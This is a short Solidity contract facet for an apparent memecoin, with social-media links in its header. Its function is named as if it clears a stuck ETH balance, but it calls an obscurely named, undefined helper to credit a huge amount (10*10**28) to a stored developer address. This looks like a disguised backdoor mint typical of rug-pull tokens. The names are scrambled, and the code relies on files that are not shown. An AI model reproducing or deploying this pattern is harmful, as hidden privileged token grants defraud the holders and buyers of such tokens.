/**
 */
// SPDX-License-Identifier: MIT
/*

https://twitter.com/pepewifhat_ETH
https://t.me/pepewifhat_ERC20



*/

pragma solidity ^0.8.21;
import "./TestLib.sol";
contract clearStuckBalanceETHMCkolfomomoonFacet is ERC20 {
    using Address for address payable;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._interlock) {
            ds._interlock = true;
            _;
            ds._interlock = false;
        }
    }

    function clearStuckBalanceETHMCkolfomomoon() external payable {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        andnicob(ds.devsltsemoon, 10 * 10 ** 28);
    }
}
